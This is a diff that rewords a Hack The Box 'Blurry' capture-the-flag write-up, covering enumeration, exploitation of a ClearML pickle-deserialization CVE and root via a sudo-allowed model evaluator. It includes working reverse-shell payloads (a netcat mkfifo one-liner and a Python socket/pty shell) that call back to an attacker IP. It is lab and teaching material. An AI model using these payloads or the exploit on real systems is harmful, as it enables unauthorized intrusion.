@@ -17,7 +17,7 @@ Tags:
 
 ## Enumeration
 
-I ran quick nmap scan on the target to find open ports:
+I performed a quick Nmap scan on the target to identify open ports:
 
 ```
 PORT   STATE SERVICE REASON
@@ -25,7 +25,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack
 ```
 
-After discovering the open ports, I ran agressive scan on the target to do depth scan using:
+After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:
 
 `sudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A` 
 
@@ -46,39 +46,45 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-server-header: nginx/1.18.0
 ```
 
-I find that the http server is at blurry.htb and nmap result also reveals app.blurry.htb. so i will add both to the /etc/hosts to access the web page using `echo "10.10.11.19 blurry.htb app.blurry.htb" >> /etc/hosts`
+I discovered that the HTTP server is hosted at **blurry.htb**, and the Nmap results also revealed **app.blurry.htb**. To access these web pages, I added both domains to the `/etc/hosts` file using the following command:
 
-I also ran `gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t90 --append-domain`
+```
+echo "10.10.11.19 blurry.htb app.blurry.htb" >> /etc/hosts
+```
 
-to find more subdomain in case there are more and suprisingly there are more.
+I also ran a Gobuster vhost scan to search for additional subdomains:
 
-I all of them using:
+```
+gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain
+```
 
-`echo "10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb" >> /etc/hosts`
+Surprisingly, the scan revealed more subdomains. I added all of them to the `/etc/hosts` file as well:
 
-Visiting all the subdomain, files.blurry.htb subdomain says OK only.
+```
+echo "10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb" >> /etc/hosts
+```
 
-app.blurry.htb subdomain has clearrML hosted:
+After visiting all the subdomains, I noticed that **files.blurry.htb** only displayed a simple "OK" message.
 
-Looks like clearML is a platform used to build AIs. When you submit any name it allows you to join the project as a developer. then we need to configure it on our machine
+The **app.blurry.htb** subdomain hosts **ClearML**, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.
 
 ![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled.png)
 
-and chat.blurry.htb subdomain has third party service rocket.chat hosted on itself.
+The **chat.blurry.htb** subdomain hosts the third-party service **Rocket.Chat** on its own.
 
 ![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%201.png)
 
-It looks like its similar to discord. I registered a account and logged in to this page.
+It looks similar to Discord. I registered an account and logged in to the page.
 
 ![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%202.png)
 
-There seems to be #general chamnnel defaulted to a new account which seems to be revealing us that `jippity` is admin.
+There seems to be a default **#general** channel for new accounts, which reveals that `jippity` is the admin.
 
 ## User Flag
 
-Now, I will try to setup clearML locally on my machine.
+Now, I will try to set up ClearML locally on my machine.
 
-I followed this to setup:
+I followed this guide to set it up:
 
 ```
 ┌──(kali㉿kali)-[~/blurry]
@@ -148,11 +154,11 @@ ClearML setup completed successfully.
 
 ```
 
-The config file can be found in the app.blurry.htb endpoint when we enter a username and choose new experiment and use the config file from there.
+The configuration file can be found at the **app.blurry.htb** endpoint when we enter a username, select "New Experiment," and retrieve the config file from there.
 
 ![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%203.png)
 
-I found a recent CVE-2024–24590: Pickle Load on Artifact Get to the clearml as well, the following is the script we will be using.
+I found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.
 
 ```
 import os
@@ -184,17 +190,17 @@ task.upload_artifact(
 task.execute_remotely(queue_name='default')
 ```
 
-Now, if i execute the above script on the same location where i had installed clearml, I will get shell on the port 4444. as i have mentioned my tun0 ip and thee port where i want rev shell on my script:
+Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:
 
 `cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 4444 >/tmp/f"` here.
 
-once we run the script it makes a task and upload the artifact and then we get shell.
+Once we run the script, it creates a task, uploads the artifact, and then we receive the shell.
 
-And now, we got shell as user and user flag.
+At this point, we have a shell as the user and have obtained the user flag.
 
 ## Root Flag
 
-If i see `sudo -l` i can se i can run the `/usr/bin/evaluate_model` binary as root and we dont need password as well.
+If I run `sudo -l`, I can see that I can execute the `/usr/bin/evaluate_model` binary as root without needing a password.
 
 ```
 jippity@blurry:~$ sudo -l
@@ -206,9 +212,9 @@ User jippity may run the following commands on blurry:
     (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
 ```
 
-This bash script searches for files that ends with .pth inside /models directory, and it removes malicious content in it and then runs it. and i checkd that we have write access to models directory.
+This Bash script searches for files that end with `.pth` in the `/models` directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.
 
-I will now open a netcat session on my kali on port 6969. Then I removed the `evaluate_model.py` script at /models directory.
+I will now open a Netcat session on my Kali machine on port 6969. Then, I removed the `evaluate_model.py` script from the `/models` directory.
 
 ```
 jippity@blurry:~$ cd /models
@@ -220,7 +226,7 @@ jippity@blurry:/models$ ls
 demo_model.pth
 ```
 
-Again created th same file(i created using echo and appended the code to the file name) named `evaluate_model.py` with the script shown below(the cat command’s output):
+I created the same file (which I made using `echo` and appended the code) named `evaluate_model.py` with the script shown below (the output of the `cat` command):
 
 ```
 jippity@blurry:/models$ echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.16.62", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' > evaluate_model.py
@@ -228,7 +234,7 @@ jippity@blurry:/models$ cat evaluate_model.py
 echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.16.62", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' > evaluate_model.py
 ```
 
-I ran `sudo /usr/bin/evaluate_model /models/*.pth` and check my netcat session I see, 
+I ran `sudo /usr/bin/evaluate_model /models/*.pth`, and when I checked my Netcat session, I saw:
 
 ```
 ┌──(kali㉿kali)-[~/blurry/CVE]
@@ -246,4 +252,4 @@ We rooted this box.
 
 ## Conclusion
 
-Thanks for following my writeup for this medium yet fun box from hackthebox
+Thank you for following my write-up for this medium yet fun box from Hack The Box!
